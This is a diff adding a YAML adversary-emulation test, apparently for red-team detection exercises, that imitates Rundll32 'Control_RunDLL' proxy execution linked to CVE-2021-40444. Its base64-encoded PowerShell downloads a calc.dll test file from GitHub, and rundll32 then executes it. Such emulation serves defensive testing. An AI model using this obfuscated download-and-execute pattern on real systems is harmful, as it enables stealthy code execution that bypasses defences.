@@ -1,0 +1,18 @@
+- id: b11b3d04-f241-5b74-84a6-ac66392b592e
+  name: Soumaia ART Tests - Rundll32 with Control_RunDLL
+  description: Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444.
+  tactic: stealth
+  technique:
+    attack_id: T1218.011
+    name: 'Signed Binary Proxy Execution: Rundll32'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGMAYQBsAGMALgBkAGwAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMAA0ADcALwBiAGkAbgAvAGMAYQBsAGMALgBkAGwAbAAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAYwBhAGwAYwAuAGQAbABsACIACgA=
+          )
+          rundll32.exe shell32.dll,Control_RunDLL ".\calc.dll"
+        payloads:
+        - calc.dll
